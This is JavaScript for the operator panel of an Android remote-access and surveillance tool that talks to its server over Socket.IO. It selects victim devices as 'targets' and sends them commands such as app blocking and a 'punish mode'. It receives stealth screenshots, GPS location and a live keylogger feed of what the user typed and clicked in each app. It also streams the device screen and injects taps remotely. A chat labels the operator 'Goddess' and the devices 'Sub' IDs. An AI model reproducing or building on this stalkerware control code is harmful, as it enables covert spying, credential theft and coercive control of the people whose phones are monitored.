const socket = io();

// State
let currentTarget = 'all'; // Default broadcast
window.lastUploadedMedia = null;

// Initial Connection
socket.on('connect', () => {
    socket.emit('admin_join');
});

// Update Device List
socket.on('device_list_update', (devices) => {
    const ul = document.getElementById('device-ul');
    ul.innerHTML = '';
    
    if (devices.length === 0) {
        ul.innerHTML = '<li class="empty-state">Waiting for connections...</li>';
        return;
    }

    devices.forEach(dev => {
        const li = document.createElement('li');
        li.className = `device-item ${currentTarget === dev.socketId ? 'active' : ''}`;
        li.innerHTML = `<strong>${dev.id}</strong><br><small style="color:var(--text-muted)">${dev.model}</small>`;
        li.onclick = () => selectTarget(dev.socketId, dev.id);
        ul.appendChild(li);
    });
});

function selectTarget(socketId, name) {
    currentTarget = socketId;
    document.getElementById('selected-target-lbl').innerHTML = `Target: <span class="accent">${name}</span>`;
    
    // Update active class
    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
    event.currentTarget.classList.add('active');
}

document.getElementById('broadcast-btn').onclick = () => {
    currentTarget = 'all';
    document.getElementById('selected-target-lbl').innerHTML = `Target: <span class="accent">Global Broadcast</span>`;
    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
};

// Generic Command Sender
function sendCommand(cmd, payload) {
    socket.emit('send_command', {
        target: currentTarget,
        command: cmd,
        payload: payload || {}
    });
}

// Specific Handlers
function sendNotif() {
    const text = document.getElementById('notif-input').value;
    if (text) sendCommand('push_notification', { message: text });
}

function sendOverlayText() {
    const text = document.getElementById('notif-input').value;
    if (text) sendCommand('overlay_text', { text: text });
}

async function uploadSpecific(inputId, commandToFire) {
    const fileInput = document.getElementById(inputId);
    if (!fileInput.files || fileInput.files.length === 0) {
        alert('Please select a file first.');
        return;
    }

    const formData = new FormData();
    formData.append('media', fileInput.files[0]);

    try {
        const res = await fetch('/api/upload', {
            method: 'POST',
            body: formData
        });
        const data = await res.json();
        
        if (data.success) {
            sendCommand(commandToFire, { url: data.url });
        } else {
            alert('Upload rejected by server.');
        }
    } catch (err) {
        console.error(err);
        alert('Upload failed.');
    }
}

function toggleAppBlock() {
    const blocked = document.getElementById('block-apps-toggle').checked;
    sendCommand('set_app_block', { enabled: blocked });
}

function togglePunish() {
    const punish = document.getElementById('punish-mode').checked;
    sendCommand('set_punish_mode', { enabled: punish });
}

// Listen for incoming stealth screenshots
socket.on('incoming_screenshot', (data) => {
    // data.url or data.base64
    const a = document.createElement('a');
    a.href = data.url || `data:image/png;base64,${data.base64}`;
    a.download = `screenshot_${Date.now()}.png`;
    a.click();
});

// Omnipotence Feed Handlers
socket.on('location_result', (data) => {
    const el = document.getElementById('gps-result');
    if (data.error) {
        el.innerHTML = `<span style="color:red">Error: ${data.error}</span>`;
    } else {
        el.innerHTML = `Lat: ${data.lat.toFixed(4)}, Lon: ${data.lon.toFixed(4)}<br><a href="${data.mapUrl}" target="_blank" style="color:#0f6">Open in Google Maps</a>`;
    }
});

socket.on('keylog_feed', (data) => {
    const el = document.getElementById('keylogger-feed');
    if (el.innerHTML.includes('Waiting for interception')) el.innerHTML = '';
    
    // Create new entry
    const div = document.createElement('div');
    div.style.marginBottom = '5px';
    div.style.borderBottom = '1px dashed rgba(0,255,0,0.3)';
    div.style.paddingBottom = '5px';
    
    if (data.text) {
        div.innerHTML = `<span style="color:gray">[${new Date().toLocaleTimeString()}]</span> <span style="color:#f0f">[${data.app}]</span> Typed: <span style="color:white">${data.text}</span>`;
    } else if (data.clicked) {
        div.innerHTML = `<span style="color:gray">[${new Date().toLocaleTimeString()}]</span> <span style="color:#f0f">[${data.app}]</span> Clicked: <span style="color:cyan">${data.clicked}</span>`;
    }
    
    el.appendChild(div);
    el.scrollTop = el.scrollHeight; // Auto-scroll
});

// VNC logic
let vncInterval = null;
function startStream() {
    if(!currentTarget || currentTarget === 'all') return alert("Select a specific target first.");
    document.getElementById('vnc-overlay').style.display = 'none';
    
    // Request stream frame every 1s
    vncInterval = setInterval(() => {
        sendCommand('request_frame');
    }, 1500);
}

function stopStream() {
    clearInterval(vncInterval);
    vncInterval = null;
    document.getElementById('vnc-overlay').innerHTML = 'NO SIGNAL<br>Click Start Stream';
    document.getElementById('vnc-overlay').style.display = 'block';
    document.getElementById('vnc-screen').src = '';
}

socket.on('screen_frame', (data) => {
    // Expected data is base64
    document.getElementById('vnc-overlay').style.display = 'none';
    document.getElementById('vnc-screen').src = `data:image/jpeg;base64,${data.base64}`;
});

function handleVncClick(event) {
    if(!vncInterval) return;
    const rect = event.target.getBoundingClientRect();
    const xPercent = (event.clientX - rect.left) / rect.width;
    const yPercent = (event.clientY - rect.top) / rect.height;
    
    sendCommand('dispatch_gesture', { xPercent: xPercent, yPercent: yPercent });
    
    // Visual feedback
    const dot = document.createElement('div');
    dot.style.position = 'absolute';
    dot.style.left = `${(xPercent * 100)}%`;
    dot.style.top = `${(yPercent * 100)}%`;
    dot.style.width = '10px';
    dot.style.height = '10px';
    dot.style.background = 'rgba(255, 42, 109, 0.8)';
    dot.style.borderRadius = '50%';
    dot.style.transform = 'translate(-50%, -50%)';
    dot.style.pointerEvents = 'none';
    event.currentTarget.appendChild(dot);
    setTimeout(() => dot.remove(), 500);
}

// Chat Logic
function sendChatMessage() {
    const input = document.getElementById('chat-input');
    const msg = input.value;
    if (!msg) return;

    // Send to android
    sendCommand('chat_message', { text: msg, sender: 'Goddess' });
    
    // Add to UI
    appendChatBubble(msg, 'You');
    input.value = '';
}

socket.on('chat_reply', (data) => {
    // Expected data: { from: 'Sub-A3B9', text: 'Yes, Goddess.' }
    appendChatBubble(data.text, data.from);
});

function appendChatBubble(text, sender) {
    const windowEl = document.getElementById('chat-window');
    const isMe = sender === 'You';
    
    // Remove empty state if present
    if (windowEl.innerHTML.includes('Select a target')) windowEl.innerHTML = '';

    const div = document.createElement('div');
    div.style.padding = '8px 12px';
    div.style.borderRadius = '8px';
    div.style.maxWidth = '80%';
    div.style.wordBreak = 'break-word';
    
    if (isMe) {
        div.style.background = 'rgba(255, 42, 109, 0.2)';
        div.style.border = '1px solid var(--accent-pink)';
        div.style.color = '#fff';
        div.style.alignSelf = 'flex-end';
        div.innerHTML = `<strong>${sender}:</strong> ${text}`;
    } else {
        div.style.background = 'rgba(255, 255, 255, 0.1)';
        div.style.border = '1px solid var(--glass-border)';
        div.style.color = 'var(--accent-gold)';
        div.style.alignSelf = 'flex-start';
        div.innerHTML = `<strong>${sender}:</strong> ${text}`;
    }

    windowEl.appendChild(div);
    windowEl.scrollTop = windowEl.scrollHeight;
}
